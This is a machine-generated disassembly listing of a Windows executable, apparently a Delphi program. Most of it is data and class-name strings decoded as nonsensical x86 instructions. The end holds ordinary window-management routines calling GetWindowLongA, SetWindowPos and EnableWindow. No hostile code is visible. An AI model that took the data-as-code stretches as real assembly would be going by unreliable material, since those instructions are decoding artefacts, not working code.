push 0x6948776f
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
shr [ ebx + eax * 2 + 0xe800 ] 0xff
push eax
outsd
jo r-xdata
add [ esi + 0x44 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
test eax 0x65ec0043
inc esp
out dx eax
inc esp
add [ eax + eax ] bh
[ eax - 0x5 ]
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0xc0ff0001
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
inc edi
je r-xdata
mov esp 0xc0004152
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
lodsb [ esi ]
inc ebx
add al ch
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
in al dx
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
aam 0xaa
imul esi [ ebp + 0x49 ] 0xd46f666e
stosb [ edi ]
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
inc ecx
add al al
jo r-xdata
add [ eax ] al
add [ eax + 0x4f13002e ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
push edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
push eax
popad
jb r-xdata
push cs
je r-xdata
insb
mov [ ecx + 0x1400043 ] dh
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc esp
outsd
ja r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
lodsd [ esi ]
inc ebx
lodsd [ esi ]
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
call 0x2445609
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
scasb [ edi ]
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
add [ eax ] al
lodsb [ esi ]
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
outsd
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
fdiv st4
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
push ebx
je r-xdata
push edi
dec esp
stosd [ edi ]
inc ebx
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] eax
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
outsd
outsd
imul eax [ eax + 0x1004166 ] 0xffffffa5
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x20 ] bp
lodsd [ esi ]
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
outsb
push ebx
je r-xdata
mov [ ecx + 0x1480043 ] dh
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e003f ] al
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
inc ebx
add al ah
add [ eax ] al
jmp eax
stosb [ edi ]
scasd [ edi ]
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
outsb
inc ebp
outsb
je r-xdata
invd
dec ecx
insb
inc esi
add bh bh
dec [ ebx + 0x4558b0c0 ]
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
add [ edi ] cl
or [ ecx + 0x4f ] cl
inc ebp
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
insd
and al 0x11
inc eax
add [ ecx ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
ficom [ edx - 0x30 ]
adc [ esi - 0x50dfff5a ] ebx
dec edi
mov esp 0xf00043ae
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
sar [ eax + ebx * 2 + 0x45 ] 0x0
prefetchw [ ecx + 0x44 ]
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10003e ] al
outsb
push edx
inc ecx
add al bh
add [ eax ] al
outsd
jb r-xdata
inc eax
add [ eax ] dh
pop ecx
inc ebp
add [ ebx ] al
add [ eax ] al
add [ ecx + ebx * 2 ] ch
inc ebp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
push eax
outsd
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x58e00040 ]
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
inc esi
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x700a0045 ] dl
outsd
inc esp
jae r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
mov eax eax
sbb [ ecx + 0x45 ] 0x0
push es
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah bl
pop eax
inc ebp
add [ eax ] cl
jae r-xdata
insb
add [ gs : eax ] eax
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
push es
add eax 0x6d726f46
jb r-xdata
jb r-xdata
inc esi
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor [ edx + 0x45 ] bl
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax ] dh
pop edx
inc ebp
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
xor al 0x5a
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
pop edx
inc ebp
inc eax
add [ eax ] bl
outsb
inc esi
outsd
jb r-xdata
pop edx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x70060045 ] al
outsd
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
pop ecx
inc ebp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
sub al 0x59
je r-xdata
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
rol [ eax + 0x6004559 ] 0xc
push esp
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jo r-xdata
push cs
je r-xdata
popad
je r-xdata
or al 0x54
inc ebp
add [ esi ] al
jns r-xdata
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
sbb [ ebx + 0x45 ] bl
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc esi
outsd
jb r-xdata
outsb
je r-xdata
inc ebx
outsd
inc ebx
insb
push eax
jb r-xdata
jns r-xdata
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
pop edx
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
je r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
outsd
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
mov al [ 0x800455b ]
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
jae r-xdata
jae r-xdata
jo r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
insd
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
jb r-xdata
arpl [ ecx + 0x4e ] sp
outsd
add [ eax ] al
add ah cl
pop edx
inc ebp
add [ esi ] al
inc esi
outsd
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
int3
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
rcr [ edx + 0x45 ] 0x1
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
xor [ ecx + 0x45 ] bl
inc esi
outsd
jb r-xdata
int3
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x5c800040 ] cl
inc ebp
add [ eax ] al
inc ebp
jbe r-xdata
add cl [ eax ]
push es
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
outsd
add [ esi ] al
jo r-xdata
add [ eax ] al
test [ edx + 0x45 ] bl
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add ah cl
pop edx
inc ebp
add [ ebp + 0x5b5c0040 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jae r-xdata
pop ecx
inc ebp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
add [ eax - 0x12 ] cl
inc ecx
add [ eax - 0x74 ] dl
inc ebp
add [ esi + ecx * 4 ] al
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 2 + 0x45 ] dh
add [ eax ] bl
pop edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] ch
inc eax
add [ eax + edx ] bh
inc ebp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
insb
mov es [ ebp ]
and al 0x6f
inc esp
add ah bl
xchg ebx eax
inc ebp
add [ eax + 0x2c004184 ] ch
nop
inc ebp
add [ eax - 0x70 ] ch
inc ebp
add [ ecx + edx * 4 + 0x45 ] dh
add [ eax + 0x600043f9 ] bl
out dx al
inc ecx
add ah ch
cdq
inc ebp
add [ eax - 0x15 ] al
inc ecx
add [ ebp + edx * 8 - 0x753bffbb ] cl
inc ebp
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add ah cl
xchg esi eax
inc ebp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add al al
xchg edi eax
inc ebp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ ecx + ebx * 4 - 0x677fffbb ] dh
inc ebp
add [ esp + edi * 8 + 0x43 ] al
add [ edx + ebx * 4 ] ch
inc ebp
add [ eax ] ah
pop ds
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add ah cl
mov [ ebp ] al
shl [ eax + 0x386c0045 ] 0x1
inc esp
add [ ebp + ebp * 4 - 0x4f0bffbb ] dl
inc ebp
add [ eax + 0x40045af ] dh
cmp [ eax + eax + 0x8 ] eax
cmp [ eax + eax + 0x2c ] eax
mov dl 0x45
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax ] ah
mov ecx 0x76140045
inc esp
add al ah
pushad
inc esp
add [ esi + ecx * 8 ] dh
inc ebp
add al al
add [ ebp ] 0x70
test [ ebp ] eax
adc al 0xbf
inc ebp
add [ eax - 0x71 ] dl
inc ebp
add ah cl
pop [ ebp ]
adc al 0xd2
inc ebp
add [ eax + 0x1800458c ] cl
int 0x45
add al bh
mov bl 0x45
add ah cl
into
inc ebp
add [ eax + 0xe004599 ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
js r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
outsd
outsd
insb
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
inc ebp
add al cl
xor eax [ eax ]
jo r-xdata
add al 0x8e
jb r-xdata
and [ eax - 0x4fd64fee ] esi
cmp eax 0x44b008b0
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
lodsb [ esi ]
pop eax
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
outsb
je r-xdata
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sbb [ ebp + eax * 2 ] 0x0
cmp al 0x10
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
adc [ eax + 0x6f ] esi
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
dec eax
popad
outsb
insb
pop es
inc edx
pop es
pop ebx
inc ebp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] al
add [ esi + 0x600455d ] dl
pop edi
inc ebp
add al bh
add al [ eax ]
add ah cl
dec esp
inc ebp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
fcomp [ ebx + 0x45 ]
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_4563fa
test al 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_456cdc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
outsb
inc ebp
add [ eax + 0x6e ] dl
inc ebp
add al bh
add al [ eax ]
add [ esp + ebx * 2 ] dh
inc ebp
add [ eax - 0x12 ] cl
inc ecx
add [ eax - 0x74 ] dl
inc ebp
add [ esi + ecx * 4 ] al
inc ebp
add al cl
xor eax [ eax ]
jo r-xdata
add [ eax ] al
sbb [ ebp ] 0x8
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ ebp * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x45 ] ah
inc ebp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
insb
mov es [ ebp ]
and al 0x6f
inc esp
add ah bl
xchg ebx eax
inc ebp
add [ eax - 0x2fffbe7c ] ch
fadd [ ebp ]
push 0x74004590
xchg ecx eax
inc ebp
add [ eax + 0x600043f9 ] bl
out dx al
inc ecx
add ah ch
cdq
inc ebp
add [ eax - 0x15 ] al
inc ecx
add [ ebp + edx * 8 - 0x289bffbb ] cl
inc ebp
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add ah cl
xchg esi eax
inc ebp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add al al
xchg edi eax
inc ebp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ ecx + ebx * 4 - 0x677fffbb ] dh
inc ebp
add [ esp + edi * 8 + 0x43 ] al
add [ edx + ebx * 4 ] ch
inc ebp
add [ eax ] ah
pop ds
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add ah cl
mov [ ebp ] al
shl [ eax + 0x386c0045 ] 0x1
inc esp
add [ ebp + ebp * 4 - 0x4f0bffbb ] dl
inc ebp
add [ eax + 0x40045af ] dh
cmp [ eax + eax + 0x8 ] eax
cmp [ eax + eax + 0x2c ] eax
mov dl 0x45
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax ] ah
mov ecx 0x76140045
inc esp
add al ah
pushad
inc esp
add [ esi + ecx * 8 ] dh
inc ebp
add al al
add [ ebp ] 0x70
test [ ebp ] eax
adc al 0xbf
inc ebp
add [ eax - 0x71 ] dl
inc ebp
add ah cl
pop [ ebp ]
adc al 0xd2
inc ebp
add [ eax + 0x1800458c ] cl
int 0x45
add al bh
mov bl 0x45
add ah cl
into
inc ebp
add [ eax + 0x9004599 ] dh
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
sub_456e28
mov edi 0x48ffbdff
fld [ ebp ]
jo r-xdata
add al bh
mov bl 0x45
add ah cl
into
inc ebp
add [ eax + 0x9004599 ] dh
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
inc ebp
add [ eax ] cl
fiadd [ ebp ]
pushad
fiadd [ ebp ]
xor al 0xdb
inc ebp
add [ ebx + ebx * 8 + 0x45 ] cl
add ah cl
xlat
inc ebp
add [ eax + 0x1c0045d8 ] dh
fld [ ebp ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
outsb
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
add [ eax ] al
add ah bh
outsb
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] cl
push esp
dec ebp
outsd
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
and al 0x6d
inc ebp
add [ edi + ebx * 2 ] dl
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ eax - 0x4bffba58 ] ah
test al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x5400408d
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x6fa40045 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x5fffba91 ] dl
add [ eax ] al
add [ eax + 0x67 ] ah
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x73ffba23 ] ch
test [ ecx ] eax
push eax
0x84a80041 0x41
xor [ eax ] eax
pop esp
xor [ eax ] eax
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
arpl [ eax - 0x70 ] bp
cld
outsb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_456fc4
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ah
out dx eax
inc ebp
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
sub al 0x70
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x45 ] bl
add [ eax + 0x4570 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40004570 ] dl
add [ eax ] eax
add [ eax + 0x67 ] ah
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
add [ eax ] al
xchg esp eax
adc [ eax ] al
push eax
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
mov [ eax ] es
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
test al 0x70
inc ebp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
sub al 0x70
inc ebp
add [ eax + ebp * 2 + 0x41 ] bl
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_4570d8
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_457124
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46091c
mov eax [ rw-data ]
call sub_41e978
mov eax [ rw-data ]
call sub_41e920
retn
push 0x0
push eax
call ShowOwnedPopups
sub_45715c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_4571ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
